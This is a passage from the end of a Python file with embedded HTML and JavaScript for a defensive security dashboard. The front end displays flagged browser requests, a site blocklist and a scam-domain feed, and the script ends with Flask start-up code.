  $("bw-days").innerHTML = dayset.map(d => `<button class="chip" data-bwday="${esc(d)}" aria-pressed="${d === BW.day}">${esc(dayLabel(d))}</button>`).join("");
  $("bk-req").textContent = sm.requests.toLocaleString(); $("bk-pages").textContent = sm.pages.toLocaleString();
  $("bk-sites").textContent = sm.sites.toLocaleString(); $("bk-new").textContent = sm.new_sites.toLocaleString();
  $("bk-flag").textContent = sm.flagged.toLocaleString(); $("bk-block").textContent = sm.blocked.toLocaleString();
  const fl = BW.days.find(d => d.day === today); const badge = $("bw-badge"); badge.textContent = fl ? fl.flagged : 0; badge.hidden = !(fl && fl.flagged);
  const max = Math.max(1, ...sm.hours.map(h => h.requests)), peak = sm.hours.reduce((a, h) => h.requests > a.requests ? h : a, sm.hours[0]);
  $("bw-hours-sub").textContent = sm.requests ? `busiest hour ${String(peak.hour).padStart(2, "0")}:00 · ${peak.requests.toLocaleString()} requests` : "";
  $("bw-hours").innerHTML = sm.hours.map(h => `<div class="hour" title="${h.hour}:00 — ${h.requests} requests, ${h.flagged} flagged">
      <div class="f" style="height:${(h.flagged / max) * 100}%"></div><div class="b" style="height:${((h.requests - h.flagged) / max) * 100}%"></div>
      ${h.hour % 3 === 0 ? `<span class="l">${String(h.hour).padStart(2, "0")}</span>` : ""}</div>`).join("");
  $("bw-flagged").innerHTML = sm.flagged_events.length ? sm.flagged_events.map(e => `<div class="item" data-bwev="${Number(e.id)}" tabindex="0" style="cursor:pointer">
      <div class="item-top">${sevPill(e.severity)}<span class="mono" style="font-size:11.5px;color:var(--faint)">${esc(fmtTime(e.time))} · ${esc(e.type)}</span></div>
      <div class="item-msg"><b>${esc(e.host)}</b>${e.blocked ? ' <span class="tag">blocked</span>' : ""}</div>
      <div class="reason">${esc((e.reasons || []).slice(0, 2).join(" · "))}</div><div class="url">${esc(e.url.slice(0, 160))}</div></div>`).join("")
    : `<div class="empty"><strong>Nothing flagged${sm.requests ? "" : " yet"}</strong>${sm.requests ? "Every request on this day looked normal." : "Once your browser is connected, risky requests show up here."}</div>`;
  $("bw-top").innerHTML = sm.top_sites.length ? sm.top_sites.map(t => `<tr>
      <td class="ip" style="cursor:default">${esc(t.site)}</td><td class="mono">${t.requests.toLocaleString()}</td><td class="mono">${t.pages}</td>
      <td>${riskCell(t.max_risk, t.severity)}</td>
      <td>${t.blocked ? '<span class="tag">blocked</span>' : `<button class="btn sm ghost" data-bwblock="${esc(t.site)}">Block</button>`}</td></tr>`).join("")
    : '<tr><td colspan="5" class="empty">No requests on this day.</td></tr>';
  $("bw-new").innerHTML = sm.new_site_list.length ? sm.new_site_list.map(n => `<div class="src"><span class="ip grow">${esc(n.site)}</span>
      <span class="mono" style="color:var(--faint);font-size:12px">${esc(fmtTime(n.first_seen))} · ${n.requests}×</span>
      ${BW.blocklist.some(b => b.site === n.site) ? '<span class="tag">blocked</span>' : `<button class="btn sm ghost" data-bwblock="${esc(n.site)}">Block</button>`}</div>`).join("")
    : '<div class="empty">No new sites on this day.</div>';
  $("bw-bl-count").textContent = BW.blocklist.length ? `${BW.blocklist.length} site${BW.blocklist.length === 1 ? "" : "s"}` : "";
  $("bw-blocklist").innerHTML = BW.blocklist.length ? BW.blocklist.map(b => `<div class="item"><div class="item-top"><span class="ip">${esc(b.site)}</span>
      <button class="btn sm ghost" data-bwunblock="${esc(b.site)}">Unblock</button></div><div class="item-meta">${esc(b.reason)} · ${esc(fmtTime(b.time))}</div></div>`).join("")
    : '<div class="empty">Nothing blocked. Sites you block are blocked in your browser within a minute.</div>';
  const tmax = Math.max(1, ...Object.values(sm.types));
  $("bw-types").innerHTML = Object.keys(sm.types).length ? Object.entries(sm.types).map(([k, v]) => `<div class="catrow"><span class="lbl">${esc(k.replace(/_/g, " "))}</span>
      <div class="bar"><span style="width:${(v / tmax) * 100}%;background:var(--low)"></span></div><span class="cnt">${v.toLocaleString()}</span></div>`).join("")
    : '<div class="empty">No data.</div>';
  const f = st.scam_feed;
  $("bw-feed").innerHTML = `${f.domains} scam domain${f.domains === 1 ? "" : "s"} watched (BBB Scam Tracker${f.phishguard_url ? " + PhishGuard" : ""}).<br>` +
    (f.phishguard_url ? (f.last_error ? `PhishGuard sync failed: ${esc(f.last_error)}` : f.last_ok ? `Synced from PhishGuard ${esc(fmtTime(f.last_ok))}.` : "Waiting for first PhishGuard sync…")
      : "Set PHISHGUARD_URL to also watch scam domains you confirm in PhishGuard.");
}
function openBrowserEvent(id) {
  const e = (BW.summary.flagged_events || []).find(x => x.id === id); if (!e) return;
  $("dr-title").innerHTML = `Browser request ${sevPill(e.severity)}`;
  const kv = [["Time", new Date(e.time).toLocaleString()], ["Site", e.site], ["Host", e.host], ["URL", e.url], ["Type", e.type], ["Method", e.method],
    ["Opened from", e.initiator_site || "—"], ["Status", e.blocked ? "Blocked by your blocklist" : e.error || e.status || "—"], ["Server IP", e.ip || "—"], ["Risk", `${e.risk}/100`]];
  $("dr-body").innerHTML = `<dl class="kv">${kv.map(([k, v]) => `<dt>${esc(k)}</dt><dd>${esc(v)}</dd>`).join("")}</dl>
    <div class="sect">Why it was flagged</div><ul style="padding-left:18px;font-size:13px">${(e.reasons || []).map(r => `<li>${esc(r)}</li>`).join("")}</ul>`;
  const blocked = BW.blocklist.some(b => b.site === e.site);
  $("dr-foot").innerHTML = blocked ? `<button class="btn" data-bwunblock="${esc(e.site)}">Unblock ${esc(e.site)}</button>`
    : `<button class="btn danger" data-bwblock="${esc(e.site)}">Block ${esc(e.site)} in my browser</button>`;
  $("scrim").classList.add("open"); $("drawer").classList.add("open"); $("dr-close").focus();
}
async function bwBlock(site, unblock) {
  try { await api(unblock ? "/api/browser/unblock" : "/api/browser/block", {method: "POST", body: JSON.stringify({site})});
        toast(unblock ? `Unblocked ${site}` : `Blocked ${site} — your browser applies it within a minute`); closeDrawer(); loadBrowser(); }
  catch (e) { toast(e.message, true); }
}
document.addEventListener("click", ev => {
  const t = ev.target.closest("[data-view],[data-bwday],[data-bwev],[data-bwblock],[data-bwunblock],[data-copy],#bw-show");
  if (!t) return;
  if (t.dataset.view) setView(t.dataset.view);
  else if (t.dataset.bwday) { BW.day = t.dataset.bwday; loadBrowser(); }
  else if (t.dataset.bwev) openBrowserEvent(Number(t.dataset.bwev));
  else if (t.dataset.bwblock) bwBlock(t.dataset.bwblock, false);
  else if (t.dataset.bwunblock) bwBlock(t.dataset.bwunblock, true);
  else if (t.id === "bw-show") { const el = $("bw-token"); const shown = el.dataset.shown === "1";
    el.textContent = shown ? "••••••••••••" : (BW.token || "…"); el.dataset.shown = shown ? "0" : "1"; t.textContent = shown ? "Show" : "Hide"; }
  else if (t.dataset.copy) { const v = t.dataset.copy === "bw-token" ? BW.token : $(t.dataset.copy).textContent;
    navigator.clipboard?.writeText(v || "").then(() => toast("Copied"), () => toast("Copy failed — select the text instead", true)); }
});
$("bw-block-form").addEventListener("submit", ev => { ev.preventDefault(); const v = $("bw-block-site").value.trim(); if (v) { $("bw-block-site").value = ""; bwBlock(v, false); } });

initMap(); renderFilters(); renderEvents(); renderAlerts();
setView(location.hash === "#browser" ? "browser" : "server");
poll(); setInterval(poll, 3000);
</script>
</body>
</html>"""


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SOC Threat Dashboard v4")
    parser.add_argument("--demo", action="store_true", help="stream synthetic attack traffic on start-up")
    parser.add_argument("--host", default=os.environ.get("SOC_HOST", "127.0.0.1"))
    parser.add_argument("--port", type=int, default=int(os.environ.get("SOC_PORT", "5000")))
    parser.add_argument("--debug", action="store_true", help="Flask debug mode (never expose publicly)")
    args = parser.parse_args()
    if args.demo:
        threading.Timer(1.5, start_demo).start()
    threading.Thread(target=_background_jobs, daemon=True).start()
    print(f"SOC Threat Dashboard v4 · {RULE_COUNT} rules · http://{args.host}:{args.port}")
    print(f"  Browser monitor: data in {DATA_DIR} · token for the extension: {BROWSER_TOKEN}")
    if PHISHGUARD_URL:
        print(f"  Scam-domain feed: {PHISHGUARD_URL}/api/iocs")
    app.run(host=args.host, port=args.port, debug=args.debug, threaded=True, use_reloader=False)
